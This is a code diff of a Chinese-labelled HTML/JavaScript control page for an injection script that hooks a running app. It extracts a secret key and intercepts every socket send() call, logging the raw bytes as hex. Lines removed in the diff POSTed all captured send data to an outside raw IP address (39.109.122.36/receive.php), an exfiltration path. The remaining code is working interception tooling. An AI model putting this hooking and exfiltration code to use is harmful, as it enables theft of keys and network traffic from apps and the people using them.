@@ -272,9 +272,9 @@ input[type=range]:focus::-webkit-slider-runnable-track {
 
         <input class="switch-btn" onclick="startHook()" type="checkbox">密钥
         <br>
-        <input class="switch-btn" onclick="startHook1()" type="checkbox">拦截
-        <br>
         <input class="switch-btn" onclick="checkUpdate()" type="checkbox">更新页面
+        <br>
+        <input class="switch-btn" onclick="startHookAllSend()" type="checkbox">所有Send
 
         <div id="infoArea" style="margin-top:10px; padding:10px;">
             <p>密钥值: <span id="keyValue">等待获取...</span></p>
@@ -369,6 +369,13 @@ if(!script) throw "frida注入脚本失败\n\nfrida inject script failed!";
 
 script.on('message', function(msg) {
 
+        if(msg.type=='send' && msg.payload.type=='send_info') {
+        console.log(`Socket: ${msg.payload.data.sockfd}`);
+        console.log(`Length: ${msg.payload.data.length}`);
+        console.log(`Flags: ${msg.payload.data.flags}`);
+        console.log(`Data: ${msg.payload.data.hexData}`);
+    }
+
 
     if(msg.type=='send' && msg.payload.type=='key_info') {
         document.getElementById('keyValue').textContent = msg.payload.data.key;
@@ -404,10 +411,9 @@ function startHook() {
     script.call("hook_get_key");
 }
 
-function startHook1() {
+function startHookAllSend() {
     script.call("hook_all_send");
 }
-
 
 
 
@@ -491,48 +497,35 @@ var savedKey = null;
         return "开始拦截获取密钥";
     };
 
-    
+
+
     rpc.exports.hook_all_send = function() {
     var send_func = h5frida.fishhook("send", 
         "int",
         ["int", "pointer", "size_t", "int"], 
         function(sockfd, buf, len, flags) {
             var rawData = new Uint8Array(buf.readByteArray(len));
-            var hexData = Array.from(rawData).map(function(byte) {
-                return ('0' + byte.toString(16)).slice(-2);
-            }).join(' ');
             
-            var xhr = new XMLHttpRequest();
-            xhr.open("POST", "http://http://39.109.122.36//receive.php", true);
-            xhr.setRequestHeader("Content-Type", "application/json");
-            xhr.send(JSON.stringify({
-                sockfd: sockfd,
-                length: len,
-                hexData: hexData,
-                timestamp: new Date().getTime()
-            }));
+            send({
+                type: "send_info",
+                data: {
+                    sockfd: sockfd,
+                    length: len,
+                    flags: flags,
+                    hexData: Array.from(rawData).map(b => b.toString(16).padStart(2,'0').toUpperCase()).join(' ')
+                }
+            });
             
             return send_func(sockfd, buf, len, flags);
         }
     );
-    return "开始监控send函数";
-};
+    return "开始拦截所有send函数";
+    };
+  
 
 
-
-
-
-
-
-
-
-
-
-    }
+}
     
-
-    //执行到这里之后script.load()才会返回 //script.load() will return after execution here
-// }
 
 /***************************************************************/
 
